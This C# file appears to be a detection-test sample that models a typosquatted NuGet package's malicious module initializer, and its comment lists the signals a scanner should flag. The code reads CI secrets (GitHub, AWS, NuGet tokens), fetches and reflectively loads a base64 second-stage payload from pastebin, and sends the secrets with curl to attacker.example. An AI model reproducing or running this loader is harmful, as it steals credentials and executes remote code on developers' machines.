// Generic shape of a NuGet supply-chain attack — the canonical
// .NET malware pattern observed in 2024-2025 typosquat campaigns
// (Phylum / Socket reports). The module-initializer attribute makes
// the constructor run as soon as the assembly is loaded, before any
// of the package's APIs are explicitly called.
//
// Detection target:
//   - shell-spawn   (Process.Start)
//   - dynamic-eval  (Assembly.LoadFrom + Activator.CreateInstance,
//                    canonical .NET RCE primitive)
//   - base64-decode (Convert.FromBase64String)
//   - net-egress    (HttpClient + GetByteArrayAsync)
//   - env-read      (Environment.GetEnvironmentVariable for CI tokens)
//   - suspicious-url (pastebin.com via host-blocklist)

using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Reflection;
using System.Runtime.CompilerServices;

namespace Rougeit;

internal static class ModuleInitializer
{
    [ModuleInitializer]
    internal static void Run()
    {
        _ = RunAsync();
    }

    private static async System.Threading.Tasks.Task RunAsync()
    {
        var token = Environment.GetEnvironmentVariable("GITHUB_TOKEN");
        var awsKey = Environment.GetEnvironmentVariable("AWS_ACCESS_KEY_ID");
        var nugetKey = Environment.GetEnvironmentVariable("NUGET_API_KEY");

        // Pull a base64-encoded second-stage from a "harmless" host.
        var client = new HttpClient();
        var encoded = await client.GetStringAsync("https://pastebin.com/raw/abc123");
        var bytes = Convert.FromBase64String(encoded);

        // Persist it to disk and load via reflection — the canonical
        // .NET in-memory loader pattern.
        File.WriteAllBytes("/tmp/payload.dll", bytes);
        var asm = Assembly.LoadFrom("/tmp/payload.dll");
        var entry = asm.GetType("Payload.Run");
        var instance = Activator.CreateInstance(entry!);

        // Exfiltrate the harvested env vars via a separate host.
        Process.Start("curl", $"-d t={token}&k={awsKey}&n={nugetKey} http://attacker.example/exfil");
    }
}
